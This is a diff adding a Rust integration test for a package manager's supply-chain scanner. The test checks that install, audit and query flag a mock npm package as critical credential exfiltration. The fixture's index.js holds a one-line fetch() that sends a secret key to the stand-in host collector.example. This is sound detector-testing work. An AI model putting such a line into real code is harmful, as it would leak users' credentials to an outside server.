@@ -354,3 +354,81 @@ async fn install_cache_and_audit_agree_on_scoped_runtime_evaluation() {
         assert_eq!(found, expected, "{source}");
     }
 }
+
+#[tokio::test]
+async fn install_audit_and_query_report_secret_uploads_as_critical_findings() {
+    let mock = MockRegistry::start().await;
+    let name = "secret-upload-control";
+    let source = "function send(secretKey) { fetch('https://collector.example/upload', {headers: {'x-session': secretKey}}); }";
+    let tarball = make_tarball_from_pkg_json(
+        serde_json::json!({"name": name, "version": "1.0.0", "license": "MIT"}),
+        &[("index.js", source.as_bytes())],
+    );
+    mock.with_package(name, "1.0.0", &tarball).await;
+    mock.with_osv_querybatch(vec![vec![]]).await;
+    let project = TempProject::empty(
+        r#"{"name":"consumer","version":"1.0.0","dependencies":{"secret-upload-control":"1.0.0"}}"#,
+    );
+    write_config(&project, "install-time-source-analysis = true\n");
+    let installed = lpm_with_registry_and_npm(&project, &mock.url())
+        .env("LPM_STORE_VERSION", "v2")
+        .args(["install", "--no-skills", "--no-editor-setup"])
+        .output()
+        .unwrap();
+    let stderr = String::from_utf8_lossy(&installed.stderr);
+    assert!(installed.status.success(), "{stderr}");
+    assert!(stderr.contains("credential exfiltration"), "{stderr}");
+    let store = lpm_store::v2::Store::at(project.home().join(".lpm/store/v2"));
+    let object = store
+        .paths()
+        .object_dir(&compute_integrity(&tarball))
+        .unwrap();
+    let cached: serde_json::Value =
+        serde_json::from_slice(&std::fs::read(object.join(".lpm-security.json")).unwrap()).unwrap();
+    assert_eq!(cached["supplyChain"]["credentialExfiltration"], true);
+    assert_eq!(cached["version"], lpm_security::behavioral::SCHEMA_VERSION);
+
+    let audit = lpm_with_registry_and_npm(&project, &mock.url())
+        .env("LPM_OSV_URL", format!("{}/v1/querybatch", mock.url()))
+        .args(["--json", "audit"])
+        .output()
+        .unwrap();
+    assert_eq!(
+        audit.status.code(),
+        Some(1),
+        "{}",
+        String::from_utf8_lossy(&audit.stderr)
+    );
+    let envelope: serde_json::Value = serde_json::from_slice(&audit.stdout).unwrap();
+    assert_eq!(envelope["counts"]["critical"], 1);
+    let issue = envelope["packages"][0]["issues"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .find(|issue| issue["rule_id"] == "credential-exfiltration")
+        .unwrap();
+    assert_eq!(issue["severity"], "critical");
+    assert_eq!(issue["evidence"][0]["path"], "index.js");
+    assert_eq!(issue["evidence"][0]["line"], 1);
+    insta::assert_json_snapshot!("audit_credential_exfiltration_evidence", envelope, {
+        ".packages[].path" => "[PACKAGE_PATH]",
+        ".packages[].instance_id" => "[INSTANCE_ID]",
+    });
+
+    for selector in [":credential-exfiltration", ":critical"] {
+        let query = lpm_with_registry_and_npm(&project, &mock.url())
+            .args(["--json", "query", selector, "--assert-none"])
+            .output()
+            .unwrap();
+        assert_eq!(
+            query.status.code(),
+            Some(1),
+            "{selector}: {}",
+            String::from_utf8_lossy(&query.stderr)
+        );
+        assert!(
+            String::from_utf8_lossy(&query.stdout).contains(name),
+            "{selector}"
+        );
+    }
+}
